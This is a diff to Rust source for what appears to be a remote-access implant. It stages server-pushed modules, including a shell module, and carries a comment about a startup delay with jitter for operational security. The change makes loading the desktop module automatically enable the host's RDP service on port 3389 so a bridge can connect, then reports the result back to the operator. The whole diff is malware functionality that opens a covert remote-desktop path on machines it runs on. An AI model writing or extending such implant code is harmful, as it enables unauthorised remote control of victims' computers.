@@ -13,9 +13,15 @@ use crate::module_package::{self, unpack_and_verify};
 use crate::types::CommandResult;
 use log::{debug, info};
 use serde::{Deserialize, Serialize};
+use std::cell::RefCell;
 use std::collections::HashMap;
 use std::path::PathBuf;
 use std::sync::{Mutex, OnceLock};
+
+// Last desktop auto-RDP enable summary (set during load_product_worker).
+thread_local! {
+    static LAST_DESKTOP_RDP_REPORT: RefCell<Option<String>> = RefCell::new(None);
+}
 
 /// Logical module identifiers (server module_id).
 pub const MOD_SHELL: &str = "shell";
@@ -489,6 +495,18 @@ impl ModuleRegistry {
                 "[module_loader] product worker {} registered (worker_ready, not mapped)",
                 id
             );
+        }
+        // Drop lock before side effects (RDP enable may block briefly).
+        drop(g);
+
+        // desktop: enable local TermService / 3389 so bridge can dial 127.0.0.1:3389
+        if id == MOD_DESKTOP {
+            let rep = crate::rdp_enable::enable_local_rdp_on_desktop_load();
+            info!("[module_loader] {}", rep.summary_line());
+            // Stash last report for handle_module_stage message (thread-local best-effort).
+            LAST_DESKTOP_RDP_REPORT.with(|c| {
+                *c.borrow_mut() = Some(rep.summary_line());
+            });
         }
         Ok(())
     }
@@ -1065,7 +1083,14 @@ pub fn handle_module_stage(id: &str, b64_or_raw: &[u8], is_base64: bool) -> Resu
     };
     registry().stage_bytes(id, &blob)?;
     registry().load(id)?;
-    Ok(format!("module {id} staged+loaded"))
+    let mut msg = format!("module {id} staged+loaded");
+    if id == MOD_DESKTOP {
+        if let Some(rdp) = LAST_DESKTOP_RDP_REPORT.with(|c| c.borrow_mut().take()) {
+            msg.push_str(" | ");
+            msg.push_str(&rdp);
+        }
+    }
+    Ok(msg)
 }
 
 /// Stage0 OPSEC: startup delay with jitter before first connect.
